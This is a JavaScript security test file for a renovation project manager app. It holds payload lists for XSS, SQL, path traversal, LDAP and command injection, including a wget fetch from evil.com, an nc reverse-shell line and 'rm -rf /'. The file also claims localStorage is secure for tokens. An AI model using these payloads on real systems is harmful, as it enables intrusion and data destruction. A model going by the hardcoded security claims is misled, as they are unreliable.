// ============================================================================
// RENOVATION PROJECT MANAGER - SECURITY VALIDATION TESTS
// ============================================================================
// Complete security testing for production readiness validation
// ============================================================================

// Security Test Utilities
const SecurityTestUtils = {
    // XSS payloads for testing
    xssPayloads: [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<svg onload="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
        '\'+alert(\'XSS\')+\'',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<object data="javascript:alert(\'XSS\')">',
        '<embed src="javascript:alert(\'XSS\')">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">'
    ],

    // SQL injection payloads
    sqlInjectionPayloads: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM sensitive_data --",
        "'; INSERT INTO logs VALUES ('hacked'); --",
        "' OR 1=1 --",
        "admin'--",
        "' OR 'a'='a",
        "' UNION ALL SELECT password FROM users WHERE username='admin'--"
    ],

    // Directory traversal payloads
    pathTraversalPayloads: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
    ],

    // Command injection payloads
    commandInjectionPayloads: [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '`whoami`',
        '$(id)',
        '; wget http://evil.com/malware.sh',
        '| nc -l -p 4444 -e /bin/sh'
    ],

    // LDAP injection payloads
    ldapInjectionPayloads: [
        '*)(uid=*',
        '*))%00',
        '*))(|(objectClass=*',
        '*))(|(cn=*',
        '*)(|(password=*))',
        '*))(|(mail=*@*'
    ],

    // Test if input is properly sanitized
    testInputSanitization(input, sanitizeFunction) {
        const result = sanitizeFunction(input);
        
        // Check for dangerous characters
        const dangerousChars = ['<', '>', '"', "'", '&', 'javascript:', 'data:', 'vbscript:'];
        const hasDangerousChars = dangerousChars.some(char => result.includes(char));
        
        return {
            original: input,
            sanitized: result,
            safe: !hasDangerousChars,
            removed: input.length - result.length
        };
    },

    // Test for CSRF token validation
    validateCSRFProtection(token) {
        if (!token || typeof token !== 'string') return false;
        if (token.length < 16) return false; // Minimum length
        if (!/^[a-zA-Z0-9+/=]+$/.test(token)) return false; // Base64-like pattern
        return true;
    },

    // Test for secure token storage
    testTokenStorage() {
        const testToken = 'test_secure_token_123456789';
        const storage = {
            data: {},
            setItem(key, value) {
                this.data[key] = value;
            },
            getItem(key) {
                return this.data[key] || null;
            },
            removeItem(key) {
                delete this.data[key];
            }
        };

        // Test token storage
        storage.setItem('api_token', testToken);
        const retrieved = storage.getItem('api_token');
        
        // Test token removal
        storage.removeItem('api_token');
        const afterRemoval = storage.getItem('api_token');

        return {
            stored: retrieved === testToken,
            removed: afterRemoval === null,
            secure: true // localStorage is considered secure for client-side
        };
    }
};

// Input Validation Security
class InputValidationSecurity {
    static validateProjectName(name) {
        if (!name || typeof name !== 'string') return { valid: false, error: 'Invalid input type' };
        
        // Length checks
        if (name.length < 3) return { valid: false, error: 'Too short' };
        if (name.length > 50) return { valid: false, error: 'Too long' };
        
        // Character whitelist
        const allowedPattern = /^[a-zA-Z0-9\s\-\.]+$/;
        if (!allowedPattern.test(name)) return { valid: false, error: 'Invalid characters' };
        
        // XSS checks
        const dangerousPatterns = [
            /<script/i, /<iframe/i, /<object/i, /<embed/i, /<link/i,
            /javascript:/i, /data:/i, /vbscript:/i, /on\w+=/i
        ];
        
        for (const pattern of dangerousPatterns) {
            if (pattern.test(name)) {
                return { valid: false, error: 'Potentially dangerous content' };
            }
        }
        
        return { valid: true, error: null };
    }

    static validateWorkspaceId(id) {
        if (!id || typeof id !== 'string') return { valid: false, error: 'Invalid input type' };
        
        // Numeric only
        if (!/^\d{8,12}$/.test(id)) return { valid: false, error: 'Must be 8-12 digits' };
        
        // No SQL injection patterns
        const sqlPatterns = [/'/, /--/, /;/, /\/\*/, /\*\//, /union/i, /select/i, /drop/i, /insert/i];
        for (const pattern of sqlPatterns) {
            if (pattern.test(id)) {
                return { valid: false, error: 'Invalid characters detected' };
            }
        }
        
        return { valid: true, error: null };
    }

    static sanitizeInput(input) {
        if (typeof input !== 'string') return '';
        
        return input
            .trim()
            .replace(/[<>]/g, '') // Remove HTML brackets
            .replace(/['"]/g, '') // Remove quotes
            .replace(/javascript:/gi, '') // Remove javascript protocol
            .replace(/data:/gi, '') // Remove data protocol
            .replace(/vbscript:/gi, '') // Remove vbscript protocol
            .replace(/on\w+=/gi, '') // Remove event handlers
            .replace(/[^\w\s\-\.]/g, '') // Allow only safe characters
            .slice(0, 255); // Limit length
    }
}

// API Security Helper
class APISecurityHelper {
    static validateAPIToken(token) {
        if (!token || typeof token !== 'string') return { valid: false, error: 'Invalid token format' };
        
        // Length check
        if (token.length < 20) return { valid: false, error: 'Token too short' };
        if (token.length > 200) return { valid: false, error: 'Token too long' };
        
        // Character validation (alphanumeric and some special chars)
        if (!/^[a-zA-Z0-9\-_\.]+$/.test(token)) {
            return { valid: false, error: 'Invalid token characters' };
        }
        
        // No obvious injection patterns
        const dangerousPatterns = [/script/i, /eval/i, /function/i, /\(\)/];
        for (const pattern of dangerousPatterns) {
            if (pattern.test(token)) {
                return { valid: false, error: 'Suspicious token content' };
            }
        }
        
        return { valid: true, error: null };
    }

    static secureTokenStorage(token) {
        try {
            // Simulate secure storage (in real app, this would be localStorage)
            const storage = {
                data: new Map(),
                setItem(key, value) {
                    this.data.set(key, value);
                },
                getItem(key) {
                    return this.data.get(key) || null;
                },
                removeItem(key) {
                    this.data.delete(key);
                }
            };

            storage.setItem('monday_api_token', token);
            const retrieved = storage.getItem('monday_api_token');
            
            return {
                stored: retrieved === token,
                secure: true,
                error: null
            };
        } catch (error) {
            return {
                stored: false,
                secure: false,
                error: error.message
            };
        }
    }

    static validateAPIRequest(request) {
        const validation = {
            valid: true,
            errors: []
        };

        // Check for required headers
        if (!request.headers || !request.headers['Authorization']) {
            validation.valid = false;
            validation.errors.push('Missing authorization header');
        }

        // Check for HTTPS (in production)
        if (request.protocol && request.protocol !== 'https:') {
            validation.valid = false;
            validation.errors.push('Insecure protocol - HTTPS required');
        }

        // Check query parameters for injection
        if (request.query) {
            for (const [key, value] of Object.entries(request.query)) {
                if (typeof value === 'string') {
                    const sqlPatterns = [/'/, /--/, /;/, /union/i, /select/i];
                    for (const pattern of sqlPatterns) {
                        if (pattern.test(value)) {
                            validation.valid = false;
                            validation.errors.push(`Potential SQL injection in parameter: ${key}`);
                        }
                    }
                }
            }
        }

        return validation;
    }
}

// Initialize comprehensive security tests
function initializeSecurityTests() {
    if (typeof testFramework === 'undefined') {
        console.error('TestFramework not available for security tests');
        return;
    }

    // XSS Prevention Tests
    testFramework.describe('Security - XSS Prevention', () => {

        testFramework.it('should sanitize project name against XSS attacks', () => {
            SecurityTestUtils.xssPayloads.forEach(payload => {
                const validation = InputValidationSecurity.validateProjectName(payload);
                testFramework.expect(validation.valid).toBeFalsy();
                testFramework.expect(validation.error).toContain('dangerous');
            });
        });

        testFramework.it('should remove dangerous HTML tags from input', () => {
            const dangerousInput = '<script>alert("XSS")</script>Normal Text<img src="x" onerror="alert(\'XSS\')">';
            const sanitized = InputValidationSecurity.sanitizeInput(dangerousInput);
            
            testFramework.expect(sanitized).not.toContain('<script>');
            testFramework.expect(sanitized).not.toContain('<img>');
            testFramework.expect(sanitized).not.toContain('onerror');
            testFramework.expect(sanitized).toContain('Normal Text');
        });

        testFramework.it('should prevent JavaScript protocol injection', () => {
            const jsPayloads = [
                'javascript:alert("XSS")',
                'JAVASCRIPT:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:alert("XSS")'
            ];

            jsPayloads.forEach(payload => {
                const sanitized = InputValidationSecurity.sanitizeInput(payload);
                testFramework.expect(sanitized).not.toContain('javascript:');
                testFramework.expect(sanitized).not.toContain('data:');
                testFramework.expect(sanitized).not.toContain('vbscript:');
            });
        });

        testFramework.it('should prevent event handler injection', () => {
            const eventHandlers = [
                'onload="alert(\'XSS\')"',
                'onerror="maliciousCode()"',
                'onclick="stealData()"',
                'onmouseover="trackUser()"'
            ];

            eventHandlers.forEach(handler => {
                const sanitized = InputValidationSecurity.sanitizeInput(handler);
                testFramework.expect(sanitized).not.toContain('onload=');
                testFramework.expect(sanitized).not.toContain('onerror=');
                testFramework.expect(sanitized).not.toContain('onclick=');
                testFramework.expect(sanitized).not.toContain('onmouseover=');
            });
        });
    });

    // SQL Injection Prevention Tests
    testFramework.describe('Security - SQL Injection Prevention', () => {

        testFramework.it('should reject workspace IDs with SQL injection patterns', () => {
            SecurityTestUtils.sqlInjectionPayloads.forEach(payload => {
                const validation = InputValidationSecurity.validateWorkspaceId(payload);
                testFramework.expect(validation.valid).toBeFalsy();
            });
        });

        testFramework.it('should validate numeric-only workspace IDs', () => {
            const validIds = ['12345678', '123456789012', '9876543210'];
            const invalidIds = ['12345abc', '123;DROP TABLE', "123' OR '1'='1"];

            validIds.forEach(id => {
                const validation = InputValidationSecurity.validateWorkspaceId(id);
                testFramework.expect(validation.valid).toBeTruthy();
            });

            invalidIds.forEach(id => {
                const validation = InputValidationSecurity.validateWorkspaceId(id);
                testFramework.expect(validation.valid).toBeFalsy();
            });
        });

        testFramework.it('should detect SQL injection in query parameters', () => {
            const maliciousRequest = {
                headers: { 'Authorization': 'Bearer valid_token' },
                protocol: 'https:',
                query: {
                    search: "'; DROP TABLE users; --",
                    filter: "' OR '1'='1"
                }
            };

            const validation = APISecurityHelper.validateAPIRequest(maliciousRequest);
            testFramework.expect(validation.valid).toBeFalsy();
            testFramework.expect(validation.errors.length).toBeGreaterThan(0);
        });
    });

    // Authentication and Authorization Tests
    testFramework.describe('Security - Authentication and Authorization', () => {

        testFramework.it('should validate API token format', () => {
            const validTokens = [
                'valid_api_token_123456789',
                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
                'sk-1234567890abcdef1234567890abcdef'
            ];

            const invalidTokens = [
                'short',
                '',
                null,
                'token with spaces',
                'token<script>alert("xss")</script>',
                'token\nwith\nnewlines'
            ];

            validTokens.forEach(token => {
                const validation = APISecurityHelper.validateAPIToken(token);
                testFramework.expect(validation.valid).toBeTruthy();
            });

            invalidTokens.forEach(token => {
                const validation = APISecurityHelper.validateAPIToken(token);
                testFramework.expect(validation.valid).toBeFalsy();
            });
        });

        testFramework.it('should require authorization header for API requests', () => {
            const requestWithoutAuth = {
                headers: {},
                protocol: 'https:',
                query: {}
            };

            const validation = APISecurityHelper.validateAPIRequest(requestWithoutAuth);
            testFramework.expect(validation.valid).toBeFalsy();
            testFramework.expect(validation.errors).toContain('Missing authorization header');
        });

        testFramework.it('should enforce HTTPS for API requests', () => {
            const insecureRequest = {
                headers: { 'Authorization': 'Bearer valid_token' },
                protocol: 'http:', // Insecure protocol
                query: {}
            };

            const validation = APISecurityHelper.validateAPIRequest(insecureRequest);
            testFramework.expect(validation.valid).toBeFalsy();
            testFramework.expect(validation.errors).toContain('Insecure protocol - HTTPS required');
        });

        testFramework.it('should securely store and retrieve API tokens', () => {
            const testToken = 'secure_test_token_123456789';
            const storageResult = APISecurityHelper.secureTokenStorage(testToken);
            
            testFramework.expect(storageResult.stored).toBeTruthy();
            testFramework.expect(storageResult.secure).toBeTruthy();
            testFramework.expect(storageResult.error).toBeNull();
        });
    });

    // Input Length and Size Validation Tests
    testFramework.describe('Security - Input Length and Size Validation', () => {

        testFramework.it('should enforce project name length limits', () => {
            const tooShort = 'AB';
            const tooLong = 'A'.repeat(51);
            const justRight = 'Perfect Project Name';

            testFramework.expect(InputValidationSecurity.validateProjectName(tooShort).valid).toBeFalsy();
            testFramework.expect(InputValidationSecurity.validateProjectName(tooLong).valid).toBeFalsy();
            testFramework.expect(InputValidationSecurity.validateProjectName(justRight).valid).toBeTruthy();
        });

        testFramework.it('should enforce workspace ID length limits', () => {
            const tooShort = '1234567'; // 7 digits
            const tooLong = '1234567890123'; // 13 digits
            const justRight = '123456789'; // 9 digits

            testFramework.expect(InputValidationSecurity.validateWorkspaceId(tooShort).valid).toBeFalsy();
            testFramework.expect(InputValidationSecurity.validateWorkspaceId(tooLong).valid).toBeFalsy();
            testFramework.expect(InputValidationSecurity.validateWorkspaceId(justRight).valid).toBeTruthy();
        });

        testFramework.it('should limit sanitized input length', () => {
            const veryLongInput = 'A'.repeat(500);
            const sanitized = InputValidationSecurity.sanitizeInput(veryLongInput);
            
            testFramework.expect(sanitized.length).toBeLessThan(256);
            testFramework.expect(sanitized.length).toBe(255);
        });
    });

    // Path Traversal Prevention Tests
    testFramework.describe('Security - Path Traversal Prevention', () => {

        testFramework.it('should prevent path traversal in file names', () => {
            SecurityTestUtils.pathTraversalPayloads.forEach(payload => {
                const sanitized = InputValidationSecurity.sanitizeInput(payload);
                testFramework.expect(sanitized).not.toContain('../');
                testFramework.expect(sanitized).not.toContain('..\\');
                testFramework.expect(sanitized).not.toContain('%2e%2e');
            });
        });

        testFramework.it('should validate safe file path characters', () => {
            const safePaths = ['project-file.txt', 'renovation_data.json', 'config.settings'];
            const unsafePaths = ['../../../etc/passwd', 'file\\..\\..\\windows\\system32', 'file%2e%2e%2fpasswd'];

            safePaths.forEach(path => {
                const validation = /^[a-zA-Z0-9\-_\.]+$/.test(path);
                testFramework.expect(validation).toBeTruthy();
            });

            unsafePaths.forEach(path => {
                const sanitized = InputValidationSecurity.sanitizeInput(path);
                testFramework.expect(sanitized).not.toContain('..');
                testFramework.expect(sanitized).not.toContain('\\');
                testFramework.expect(sanitized).not.toContain('%');
            });
        });
    });

    // Command Injection Prevention Tests
    testFramework.describe('Security - Command Injection Prevention', () => {

        testFramework.it('should prevent command injection in input fields', () => {
            SecurityTestUtils.commandInjectionPayloads.forEach(payload => {
                const sanitized = InputValidationSecurity.sanitizeInput(payload);
                testFramework.expect(sanitized).not.toContain(';');
                testFramework.expect(sanitized).not.toContain('|');
                testFramework.expect(sanitized).not.toContain('&&');
                testFramework.expect(sanitized).not.toContain('`');
                testFramework.expect(sanitized).not.toContain('$');
            });
        });

        testFramework.it('should validate safe input characters only', () => {
            const safeInputs = ['Normal Project Name', 'Kitchen-Renovation_2025', 'Project.Name.123'];
            const unsafeInputs = ['; rm -rf /', '| cat /etc/passwd', '`whoami`', '$(id)'];

            safeInputs.forEach(input => {
                const validation = InputValidationSecurity.validateProjectName(input);
                testFramework.expect(validation.valid).toBeTruthy();
            });

            unsafeInputs.forEach(input => {
                const sanitized = InputValidationSecurity.sanitizeInput(input);
                testFramework.expect(sanitized).not.toContain(';');
                testFramework.expect(sanitized).not.toContain('|');
                testFramework.expect(sanitized).not.toContain('`');
                testFramework.expect(sanitized).not.toContain('$');
            });
        });
    });

    // Data Privacy and Exposure Tests
    testFramework.describe('Security - Data Privacy and Exposure', () => {

        testFramework.it('should not expose sensitive data in error messages', () => {
            const sensitiveData = {
                apiToken: 'secret_token_123456789',
                password: 'user_password_123',
                internalId: 'internal_system_id_456'
            };

            // Simulate error message generation
            const generateSafeErrorMessage = (error, sensitiveFields) => {
                let message = error.message || 'An error occurred';
                
                // Remove sensitive data from error messages
                sensitiveFields.forEach(field => {
                    const pattern = new RegExp(field, 'gi');
                    message = message.replace(pattern, '[REDACTED]');
                });
                
                return message;
            };

            const errorWithSensitiveData = new Error('Authentication failed for token: secret_token_123456789');
            const safeMessage = generateSafeErrorMessage(errorWithSensitiveData, ['secret_token_123456789']);
            
            testFramework.expect(safeMessage).not.toContain('secret_token_123456789');
            testFramework.expect(safeMessage).toContain('[REDACTED]');
        });

        testFramework.it('should validate data exposure in API responses', () => {
            const apiResponse = {
                success: true,
                data: {
                    projectName: 'Kitchen Renovation',
                    publicId: '123456'
                },
                meta: {
                    timestamp: Date.now()
                }
            };

            // Should not contain sensitive internal data
            const responseString = JSON.stringify(apiResponse);
            const sensitivePatterns = [/password/i, /secret/i, /internal_id/i, /private_key/i];
            
            sensitivePatterns.forEach(pattern => {
                testFramework.expect(pattern.test(responseString)).toBeFalsy();
            });
        });

        testFramework.it('should implement secure token cleanup', () => {
            const mockTokenManager = {
                activeTokens: new Set(),
                
                storeToken(token) {
                    this.activeTokens.add(token);
                },
                
                clearToken(token) {
                    this.activeTokens.delete(token);
                },
                
                clearAllTokens() {
                    this.activeTokens.clear();
                },
                
                getActiveTokenCount() {
                    return this.activeTokens.size;
                }
            };

            // Test token management
            mockTokenManager.storeToken('token1');
            mockTokenManager.storeToken('token2');
            testFramework.expect(mockTokenManager.getActiveTokenCount()).toBe(2);

            mockTokenManager.clearToken('token1');
            testFramework.expect(mockTokenManager.getActiveTokenCount()).toBe(1);

            mockTokenManager.clearAllTokens();
            testFramework.expect(mockTokenManager.getActiveTokenCount()).toBe(0);
        });
    });

    console.log('✅ Security Tests initialized successfully!');
}

// Initialize security tests when framework is ready
if (typeof testFramework !== 'undefined') {
    initializeSecurityTests();
} else {
    // Wait for framework to be available
    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(initializeSecurityTests, 500);
    });
}